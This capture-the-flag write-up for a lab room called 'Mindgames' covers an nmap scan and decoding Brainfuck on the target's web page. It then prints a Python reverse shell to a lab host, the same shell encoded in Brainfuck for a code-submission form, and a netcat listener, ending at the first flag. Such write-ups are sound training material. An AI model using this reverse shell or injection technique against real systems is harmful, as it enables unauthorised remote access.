# Mindgames write-up.
![room](https://user-images.githubusercontent.com/110361097/182584894-83f22081-1cbf-4aa8-afab-7ae39ffc5c1a.JPG)

HINT: No hints. Hack it. Don't give up if you get stuck, enumerate harder.

## Preparation:
Set the IP address as an environment variable in a terminal to make the process simple.

`export IP=10.10.242.185`

Access the IP variable with: $IP

## Reconnaissance:
Scan the IP address with nmap.

`nmap -A -Pn -sV -p- $IP -v -T 4`

**Result:**

![res-1](https://user-images.githubusercontent.com/110361097/182585019-1fcc6006-034d-4816-8ddb-53f77c7340b5.JPG)

So, we have ports 22 and 80 with services as ssh/web server.

## Enumeration:
Let's see what's on port 80's initial page.

`curl http://$IP -v`

**Result:**

![](/img/res-2.JPG)
![res-2](https://user-images.githubusercontent.com/110361097/182585173-f003d266-95f9-44e0-9990-8f3da077f2c8.JPG)


Possible Pivot Routes/Points Of Interest:

- /main.js
- /main.css

**Observations:**

We have references to:
* Programming
* Hello, World
* Fibonacci
* Code that contains ".-+[]<>"

This code looks familiar...

I'll assess the code sequence/pattern with a [cipher-identifier](https://www.dcode.fr/cipher-identifier)

The code has been identified as "Brainfuck".

**Info:**

Kind of makes sense since the room's name is mindgames...

We'll press on with decoding.

* Hello, World: `print("Hello, World")`
* Fibonacci:    `def F(n): if n <= 1 1: return f(n-1)+f(n-2) for i in range(10): print(f(i))`

Nothing looks interesting here. Just some standard code running on an interpreter.

Based on the initial webpage having a "Try before you buy" feature that took *trusted*
input from the user, we can assume this may be our first attack point as it would be a simple
web app using the Brainfuck code unfiltered/unsanitized as source-code input.

The code language that needs wrapping with Brainfuck is Python, this is assumed based on the "Hello, World" code that was decoded earlier.

We'll begin by generating a Python reverse shell over at: https://www.revshells.com, then encode it with Brainfuck at: https://www.splitbrain.org/_static/ook/. With this, we will try for a reverse shell first.

**The Setup:**

Python Reverse Shell: 

`import os,pty,socket;s=socket.socket();s.connect(("10.10.52.202",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")`

Brainfuck wrapped:

`	+++++ +++++ [->++ +++++ +++<] >++++ +.+++ +.+++ .-.++ +.++. <++++ +++++
            [->-- ----- --<]> ---.< +++++ +++[- >++++ ++++< ]>+++ +++++ +++++ ++.++
            ++.<+ +++++ ++[-> ----- ---<] >---- ---.< +++++ +++[- >++++ ++++< ]>+++
            +.+++ +.+++ ++.<+ +++++ ++[-> ----- ---<] >---- ----- ----. <++++ ++++[
            ->+++ +++++ <]>++ +++++ .---- .<+++ [->-- -<]>- --.++ +++++ +.--- ---.<
            +++[- >+++< ]>+++ +++.< +++++ ++[-> ----- --<]> ----- ---.< +++++ ++[->
            +++++ ++<]> +++++ ++.<+ +++++ +[->- ----- -<]>- ----. <++++ +++[- >++++
            +++<] >++++ +.--- -.<++ +[->- --<]> ---.+ +++++ ++.-- ----. <+++[ ->+++
            <]>++ ++++. <++++ ++++[ ->--- ----- <]>-- ----. <++++ ++++[ ->+++ +++++
            <]>++ +++.- ---.< +++[- >---< ]>--- .++++ ++++. ----- -.<++ +[->+ ++<]>
            +++++ +.<++ +++++ +[->- ----- --<]> ----- ----- --.+. <++++ [->++ ++<]>
            ++.<+ +++++ +[->+ +++++ +<]>+ +++++ +.<++ +++++ +[->- ----- --<]> -----
            .<+++ ++++[ ->+++ ++++< ]>+++ +.<++ +[->+ ++<]> +++.- ..--- ----- -.--.
            <++++ [->++ ++<]> +.<++ +++++ +[->- ----- --<]> ----- ----- --..- -----
            .<+++ [->++ +<]>+ +++++ .-.-- .+++. -.--. +++++ ++.-- -.--- -.+++ +.--.
            ++.<+ +++[- >---- <]>.< +++[- >+++< ]>+.+ +++++ ++... .<+++ [->-- -<]>-
            -..<+ +++[- >++++ <]>++ .<+++ ++[-> +++++ <]>++ +++++ .<+++ +[->+ +++<]
            >++++ .++++ .<+++ +++++ [->-- ----- -<]>- ----. <++++ +++[- >++++ +++<]
            >++++ +.<++ ++[-> ++++< ]>+.- ----. <++++ +++[- >---- ---<] >---- -----
            ----. <+++[ ->--- <]>-. <++++ ++++[ ->+++ +++++ <]>++ +++++ ++++. <++++
            ++++[ ->--- ----- <]>-- ---.< +++++ ++[-> +++++ ++<]> +++++ ++.++ +.+++
            .---- ---.+ +++++ +++.+ .<+++ +++++ [->-- ----- -<]>- ----- -.+.+ ++.<+
            +++++ +[->+ +++++ +<]>+ +++++ +++.< +++++ ++[-> ----- --<]> ----- -----
            --.<+ +++++ +[->+ +++++ +<]>+ +++++ +++++ +.+++ +++++ +.+++ .<+++ +++++
            +[->- ----- ---<] >-.<+ +++++ ++[-> +++++ +++<] >++++ ++.<+ +++++ ++[->
            ----- ---<] >---- --.<+ +++++ ++[-> +++++ +++<] >++++ +++++ .++++ +.<++
            +++++ +[->- ----- --<]> ----- -.+++ +++++ .---- .++++ +.--- --.++ ++++.
            ----- ----. <++++ +++[- >++++ +++<] >+++. <++++ +[->- ----< ]>--- -----
            -.<++ +++++ [->++ +++++ <]>++ ++.++ ++.++ +++.< +++++ +++[- >---- ----<
            ]>--- ----- ---.< +++++ +++[- >++++ ++++< ]>+++ ++.-- -.<++ +[->- --<]>
            ----- -.<++ ++[-> ++++< ]>+++ +++.- ----- ---.< +++++ +++[- >---- ----<
            ]>--- ---.- ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> +++++ ++<]> ++.++
            +++++ .++++ +.<++ +++++ [->-- ----- <]>-- ----- ----- --.<+ +++++ +[->+
            +++++ +<]>+ +.-.< ++++[ ->+++ +<]>+ +.<++ +[->- --<]> --.<+ +++++ ++[->
            ----- ---<] >---- --.++ +++++ .<`

rlwrap listner:

`rlwrap -cAr nc -lvnp 4444`

We need to have our listener running first, then submit the wrapped code into the
"Try before you buy" submission form. 

Now submit the encoded reverse shell in the submission form with your netcat listener running and you should get the shell pop.

**Result:**

![res-4](https://user-images.githubusercontent.com/110361097/182585214-43e76183-9f44-4388-a18c-5161b0fcd2ac.JPG)


We now have shell access! Let's look for the user.txt file.

Our initial directory path is "/home/mindgames/webserver", so goto the user's home "/home/mindgames". 

Perform a directory listing and find the "user.txt" file.

![res-5](https://user-images.githubusercontent.com/110361097/182585240-7594a3d0-bc4d-495c-a7bf-e5593d3fc568.JPG)


## Flag 1:

![flag1](https://user-images.githubusercontent.com/110361097/182585255-e6e3eee9-00da-4bc5-af83-8137b7f9296d.JPG)

## Privilege Escalation:

To be continued...

**Result:**
